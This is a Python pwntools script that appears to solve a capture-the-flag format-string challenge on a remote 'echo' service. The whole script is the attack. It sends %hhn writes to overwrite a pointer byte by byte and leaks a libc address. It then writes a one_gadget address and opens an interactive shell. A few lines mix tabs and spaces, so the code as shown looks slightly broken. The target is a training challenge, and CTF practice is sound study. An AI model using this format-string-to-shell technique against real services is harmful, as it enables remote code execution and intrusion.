from pwn import *

f = open("a", "w")
for i in range(100):
    try:
        #r = process("./echo", stderr=f)
        r = remote("csie.ctf.tw", "10132")

        fd = "601010"
        offset = 0xe0

        r.send("%{}c%7$hhn".format(int(fd[-2:],16)).ljust(0x2f, "_")+".")
        for i in range(2,6,2):
            offset += 1
            r.send(("%" + str(offset & 0xff) + "c%5$hhn").ljust(0x2f, "_")+".")
            r.send("%{}c%7$hhn".format(int(fd[-i-2:-i],16)).ljust(0x2f, "_")+".")
        for i in range(4):
            offset += 1
            r.send(("%" + str(offset) + "c%5$hhn").ljust(0x2f, "_")+".")
            r.send("%7$hhn".ljust(0x2f, "_")+".")

        r.send("%1c%9$hhn".ljust(0x2f, "_")+".")

	r.send("%10$p".ljust(0x2f, "_")+"*")
        r.recvuntil("0x")
        print(r.recvuntil("*"))
        
        r.send("%10$p".ljust(0x2f, "_")+"*")
        start_main = r.recvuntil("_")[:-1]
        r.recvuntil("*")
        libc = int(start_main, 16) - 0x21b97
        print("libc: " + hex(libc))
        one_gadget = hex(libc + 0x4f2c5)
        print("one_gadget: " + one_gadget)
        
        offset += 2
	r.send(("%" + str(offset) + "c%5$hhn").ljust(0x2f, "_")+".")
        r.send("%{}c%7$hhn".format(int(one_gadget[-2:],16)).ljust(0x2f, "_")+".") 
        
        for i in range(2,10,2):
            offset += 1
            r.send(("%" + str(offset) + "c%5$hhn").ljust(0x2f, "_")+".")
            r.send("%{}c%7$hhn".format(int(one_gadget[-i-2:-i],16)).ljust(0x2f, "_")+".")
        
        r.send("%10$p".ljust(0x2f, "_")+"*")
        r.recvuntil("0x")
        print(r.recvuntil("*"))
        
        r.send("exit")
        sleep(0.3)
        r.recvuntil(":")
        r.send("xx")
        sleep(0.3)
        r.interactive()
    except EOFError:
        continue
f.close()
